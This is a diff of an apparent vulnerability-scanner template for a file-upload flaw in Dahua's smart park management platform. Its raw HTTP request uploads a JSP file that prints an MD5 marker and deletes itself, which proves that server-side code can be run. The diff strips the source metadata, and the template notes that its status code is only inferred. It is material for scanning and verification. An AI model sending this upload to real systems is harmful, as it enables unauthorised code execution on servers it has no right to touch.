@@ -3,14 +3,8 @@ info:
   name: 大华智慧园区综合管理平台文件上传漏洞1
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxymah01pbf33bk8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lxymah01pbf33bk8
-    fofa: 暂无
 http:
 - raw:
   - 'POST /publishing/publishing/material/file/video HTTP/1.1
@@ -22,14 +16,10 @@ http:
     Accept-Encoding: gzip, deflate
 
 
-
-
     --dd8f988919484abab3816881c55272a7
 
 
     Content-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"
-
-
 
 
     <%@page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
@@ -41,8 +31,6 @@ http:
     Content-Disposition: form-data; name="poc"
 
 
-
-
     poc
 
 
@@ -50,8 +38,6 @@ http:
 
 
     Content-Disposition: form-data; name="Submit"
-
-
 
 
     submit
